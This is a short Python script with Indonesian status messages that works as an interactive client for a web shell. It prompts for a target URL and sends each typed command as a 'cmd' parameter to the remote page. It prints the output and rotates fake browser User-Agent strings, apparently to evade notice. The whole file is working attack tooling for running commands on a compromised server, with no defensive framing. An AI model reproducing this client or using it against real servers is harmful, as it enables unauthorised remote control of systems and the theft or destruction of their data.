import requests

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
]

import random

def execute_command(url, command):
    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }

    try:
        response = requests.get(url, params={"cmd": command}, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[+] Output:\n")
            print(response.text)
        else:
            print(f"[-] Gagal! Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    target_url = input("URL target: ").strip()

    print(f"[*] Target: {target_url}")

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() in ["exit", "quit"]:
            print("[*] Keluar...")
            break
        execute_command(target_url, cmd)
